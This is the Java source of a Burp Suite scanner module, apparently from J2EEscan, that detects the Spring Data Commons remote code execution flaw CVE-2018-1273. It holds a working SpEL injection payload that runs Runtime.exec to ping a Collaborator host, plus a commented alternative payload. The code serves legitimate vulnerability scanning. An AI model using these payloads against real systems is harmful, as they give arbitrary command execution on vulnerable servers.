package burp.j2ee.issues.impl;

import static burp.HTTPMatcher.isJavaApplicationByURL;
import burp.HTTPParser;
import static burp.HTTPParser.isJSONRequest;
import burp.IBurpCollaboratorClientContext;
import burp.IBurpCollaboratorInteraction;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

/**
 *
 * Spring Data Commons Remote Code Execution - CVE-2018-1273
 *
 * 
 */
public class SpringDataCommonRCE implements IModule {

    private static final String TITLE = "Spring Data Commons Remote Code Execution - CVE-2018-1273";
    private static final String DESCRIPTION = "J2EEscan identified a remote command execution on the Spring Data Commons component.<br />"
            + "Spring Data Commons, versions prior to 1.13 to 1.13.10, 2.0 to 2.0.5, and older unsupported versions, contain a property binder "
            + "vulnerability caused by improper neutralization of special elements. "
            + "<br /><br />"
            + "<b>References</b>:<br />"
            + "https://pivotal.io/security/cve-2018-1273<br />"
            + "https://gist.github.com/matthiaskaiser/bfb274222c009b3570ab26436dc8799e<br />"
            + "https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a<br />"
            + "https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653<br />"
            + "https://twitter.com/h3xstream/status/984098634353475584<br />"
            + "https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&mid=2247483666&idx=1&sn=91e3b2aab354c55e0677895c02fb068c<br />"
            + "https://xz.aliyun.com/t/2269";

    private static final String REMEDY = "Upgrade the Spring Data Commons library";

    private PrintWriter stderr;
    private PrintWriter stdout;

    @Override
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);
        stdout = new PrintWriter(callbacks.getStderr(), true);

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        URL url = reqInfo.getUrl();

        List<IScanIssue> issues = new ArrayList<>();

        if (!isJavaApplicationByURL(url)) {
            return issues;
        }

        String contentTypeHeader = HTTPParser.getRequestHeaderValue(reqInfo, "Content-type");

        // Skip not POST request and request with JSON elements
        if (contentTypeHeader == null) {
            return issues;
        }
        if (isJSONRequest(contentTypeHeader)) {
            return issues;
        }

        List<String> headers = reqInfo.getHeaders();
        String request = helpers.bytesToString(baseRequestResponse.getRequest());
        String requestBody = request.substring(reqInfo.getBodyOffset());

        String injection = "[#this.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"%s\")]=";
        // Alternative payload 
        // [#this.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('ping+host')")]

        // Collaborator context
        IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
        String currentCollaboratorPayload = collaboratorContext.generatePayload(true);

        // Payload to trigger remote ping
        String pingPayload = "ping -c 3 " + currentCollaboratorPayload;
        String finalPayload = String.format(injection, pingPayload);
        String updatedBody = requestBody.replace("=", finalPayload);

        //  Build request
        byte[] message = helpers.buildHttpMessage(headers, updatedBody.getBytes());
        IHttpRequestResponse resp = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), message);

        // Poll Burp Collaborator for remote interaction
        List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

        if (!collaboratorInteractions.isEmpty()) {
            issues.add(new CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    reqInfo.getUrl(),
                    resp,
                    TITLE,
                    DESCRIPTION,
                    REMEDY,
                    Risk.High,
                    Confidence.Certain
            ));
        }

        return issues;

    }
}
